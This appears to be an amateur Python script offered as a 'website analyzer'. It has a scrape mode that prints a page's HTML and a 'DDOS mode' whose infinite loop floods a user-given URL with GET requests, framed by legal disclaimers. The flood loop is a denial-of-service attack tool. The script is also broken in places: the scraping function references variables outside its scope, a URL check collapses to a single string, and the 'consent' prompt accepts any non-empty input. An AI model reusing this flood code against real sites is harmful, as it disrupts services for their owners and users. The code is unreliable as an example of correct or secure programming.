#my code

import urllib.request
import requests

count = int(0)

def data_handler():
  #make the request, along with scraping the data
  request = urllib.request.Request(url, None, headers)
  response = urllib.request.urlopen(request)
  data = str(response.read())
  #printing the data
  print(data)
  #feature check, checks if certain features are present on the website.
  substring1 = "http://" or "https://"
  substring2 = ".js"
  substring3 = ".css"
  if substring1 in data:
    print("links have been found in this website.")
  elif substring2 in data:
    print("javascript code has been detected")
  elif substring3 in data:
    print("css design code has been detected")
  else: print("legacy html-only website detected")

def scrape_mode():
  #user-agent assigned to prevent null user-agent from causing issues
  user_agent = \
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
  #url input from the user
  url = str(input("input the url you wish to view the html code for"))
  #user-agent implementation
  headers = {'User-Agent': user_agent}
  #security scanner to detect if the websites connection is going to be secure
  substring = "http://"
  data_handler()
  if substring in url:
    #insecure connections consent, asks the user for consent if the script is allowed to connect to an insecure host
    continueexec = bool(input("true or false, this connection you are about to make has been detected as insecure, and will likely expose parts of this machine to the internet without encryption. will you like to connect to this website anyways? (true or false)"))
    if continueexec == bool("true"):
      data_handler()
      #L bozo
    else: print("execution ended")

def ddos_mode():
  #Covering my own ass (legal stuff)
  print("WARNING, THIS CAN BE ILLEGAL IF YOU DDOS THE WRONG WEBSITE!! FOLLOW YOUR LOCAL CYBERSECURITY LAWS oN TESTING, AND REMEMBER, IF YOU HAVE NO *EXPLICIT* PERMISSION, THE ANSWER ON IF YOU CAN DDOS THAT WEBSITE IS A STRICT NO!!!! THE CREATOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT.")
  user_agent = \
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
  #the same url implementation from the scrape section
  url = str(input("input the url you wish to DDOS and MAKE SURE YOU HAVE TESTING PERMISSIONS FROM THE WEBSITES IT DIVISION, if you do not, you will need to do testing on your own website and or server. this script will spam GET requests on the given URL"))
  headers = {'User-Agent': user_agent}
  #infinite loop implementation for spam
  def zero_to_infinity():
    i = 0
    while True:
        yield i
        i += 1

  for x in zero_to_infinity():
    #accumulator implementation
    global count
    count += 1
    #here is where the magic happens!! (it is making the spammed requests)
    request = urllib.request.Request(url, None, headers)
    response = urllib.request.urlopen(request)
    print(count, "requests made!")

  
#splash screen
print("welcome to my website analyzer, written in python!!, any testing on any website requires STRICT PERMISSION FROM THE OWNERS OR ADMINISTRATORS AS PER FEDERAL LAW")


#mode selection
selectmode = int(input("select mode, 1=DDOS mode, 2=scrape mode"))


#mode selection enumeration.
if selectmode == int(2):
  scrape_mode()
elif selectmode == int(1):
  ddos_mode()
else: print("invalid input detected")





